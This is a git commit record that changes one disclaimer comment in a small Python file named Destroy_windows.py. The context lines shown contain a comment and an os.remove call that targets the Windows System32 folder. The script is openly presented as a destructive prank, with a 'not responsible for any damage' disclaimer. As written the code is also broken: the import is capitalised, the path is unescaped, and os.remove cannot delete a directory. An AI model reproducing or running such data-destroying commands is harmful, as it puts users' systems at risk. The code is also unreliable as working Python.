c60e3f233171c487f7d895b29dfe495da07cbdec
john220099 <148237962+John220099@users.noreply.github.com>
2024-04-26 20:02:47 +0200

    Update Destroy_windows.py

--- Destroy_windows.py
+++ Destroy_windows.py
@@ -3,4 +3,4 @@ Import os
 #delete the windows system32 folder
 os.remove("C:\Windows\System32")
 
-#also DON'T try this at home :D
+#also DON'T try this at home I am not responsible for any damage done 
